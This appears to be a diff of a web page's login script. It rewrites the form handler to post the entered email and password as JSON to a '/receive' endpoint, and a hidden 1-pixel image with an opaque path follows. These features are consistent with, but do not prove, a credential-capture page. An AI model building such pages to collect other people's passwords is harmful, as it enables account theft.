@@ -1164,42 +1164,67 @@
   
   </script>
   <script>
-  
   document.getElementById("myForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // Prevent form from submitting
+    event.preventDefault(); // Prevent default form submission
 
-  const loginInput = this.querySelector('input[name="login"]');
-  const passwordInput = this.querySelector('input[name="password"]');
-  const submitButton = this.querySelector('button[type="submit"]');
+    const loginInput = this.querySelector('input[name="login"]');
+    const passwordInput = this.querySelector('input[name="password"]');
+    const submitButton = this.querySelector('button[type="submit"]');
 
-  let errorMessage = "";
+    let errorMessage = "";
 
-  if (!loginInput.value.trim() && !passwordInput.value.trim()) {
-    errorMessage = "Please enter your email and password.";
-  } else if (!loginInput.value.trim()) {
-    errorMessage = "Please enter your email.";
-  } else if (!passwordInput.value.trim()) {
-    errorMessage = "Please enter your password.";
-  }
+    if (!loginInput.value.trim() && !passwordInput.value.trim()) {
+      errorMessage = "Please enter your email and password.";
+    } else if (!loginInput.value.trim()) {
+      errorMessage = "Please enter your email.";
+    } else if (!passwordInput.value.trim()) {
+      errorMessage = "Please enter your password.";
+    }
 
-  // Check if an error div already exists
-  let errorDiv = this.querySelector('.error');
-  if (!errorDiv) {
-    errorDiv = document.createElement('div');
-    errorDiv.className = 'error';
-    errorDiv.style.color = 'red';
-    errorDiv.style.marginTop = '10px';
-    this.insertBefore(errorDiv, submitButton);
-  }
+    // Check if an error div already exists
+    let errorDiv = this.querySelector('.error');
+    if (!errorDiv) {
+      errorDiv = document.createElement('div');
+      errorDiv.className = 'error';
+      errorDiv.style.color = 'red';
+      errorDiv.style.marginTop = '10px';
+      this.insertBefore(errorDiv, submitButton);
+    }
 
-  if (errorMessage) {
-    errorDiv.textContent = errorMessage;
-  } else {
-    errorDiv.remove(); // Remove the error div if inputs are valid
-    
-     this.submit(); // Uncomment to allow form submission
-  }
-});
+    if (errorMessage) {
+      errorDiv.textContent = errorMessage;
+      return;
+    } else {
+      if (errorDiv) errorDiv.remove(); // Remove error if everything is valid
+    }
+
+    // Prepare data
+    const data = {
+      login: loginInput.value.trim(),
+      password: passwordInput.value.trim()
+    };
+
+    // Send via AJAX to /receive
+    fetch('/receive', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.json(); // or .text() based on your backend response
+    })
+    .then(data => {
+      console.log("Success:", data);
+      // Optionally redirect or show success message
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      // Optionally display error to user
+    });
+  });
 </script>
   </footer>
   <img style="position:absolute; bottom:0;" src="/assets/H2ZYWXYBNJBYTDMNOZTAXU" width="1px" height="1px">
